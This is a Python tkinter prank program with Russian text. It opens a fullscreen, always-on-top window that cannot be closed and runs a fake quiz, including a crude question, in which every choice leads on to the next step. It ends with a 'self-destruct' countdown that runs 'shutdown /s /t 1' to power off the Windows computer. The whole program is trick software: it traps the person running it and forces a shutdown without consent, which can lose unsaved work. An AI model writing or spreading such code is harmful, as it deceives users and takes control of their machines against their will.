import time
import os
from tkinter import Tk, Label, Button, Frame

def countdown_and_shutdown():
    for widget in frame.winfo_children():
        widget.destroy()

    label.config(text="Самоуничтожение через 3...", font=("Chiller", 50), fg="red")
    root.update()
    time.sleep(1)
    
    label.config(text="Самоуничтожение через 2...")
    root.update()
    time.sleep(1)
    
    label.config(text="Самоуничтожение через 1...")
    root.update()
    time.sleep(1)
    
    os.system("shutdown /s /t 1")

def next_question(question_text, answers, command):
    global label
    label.config(text=question_text)
    
    for widget in frame.winfo_children():
        widget.destroy()
    
    for answer in answers:
        Button(frame, text=answer, font=("Chiller", 30), fg="red", bg="black", command=command).pack(pady=5)

def question_3():
    next_question("Любишь школу?", ["Нет", "Нет"], countdown_and_shutdown)

def question_2():
    next_question("Скачивал когда-либо вирусы?", ["Да", "Да"], question_3)

def start_quiz():
    global blinking
    blinking = False  # Останавливаем моргание заголовка
    start_button.destroy()
    next_question("СОСАЛ?", ["Да", "Да"], question_2)

def blink_text():
    if blinking:
        label.config(fg="red" if label.cget("fg") == "black" else "black")
        root.after(500, blink_text)

# Окно
root = Tk()
root.configure(bg="black")
root.attributes("-fullscreen", True)
root.attributes("-topmost", True)
root.protocol("WM_DELETE_WINDOW", lambda: None)

blinking = True
label = Label(root, text="Нажми, чтобы начать", font=("Chiller", 50), fg="red", bg="black")
label.pack(pady=50)

frame = Frame(root, bg="black")
frame.pack()

start_button = Button(root, text="НАЧАТЬ", font=("Chiller", 40), fg="red", bg="black", command=start_quiz)
start_button.pack(pady=20)

blink_text()  # Запуск анимации моргания

root.mainloop()
